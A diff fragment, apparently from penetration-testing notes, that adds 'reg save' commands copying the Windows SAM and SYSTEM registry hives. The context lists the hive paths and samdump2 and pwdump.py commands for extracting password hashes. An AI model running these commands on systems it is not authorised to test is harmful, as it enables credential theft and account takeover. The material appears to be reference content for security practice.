@@ -18,6 +18,9 @@ Default file location:
 C:\Windows\System32\config\SAM
 C:\Windows\System32\config\SYSTEM
 
+reg save HKLM\SAM c:\SAM
+reg save HKLM\System c:\System
+
 Dumping hashes:
 samdump2 SYSTEM SAM
 pwdump.py SYSTEM SAM    # For Windows 10
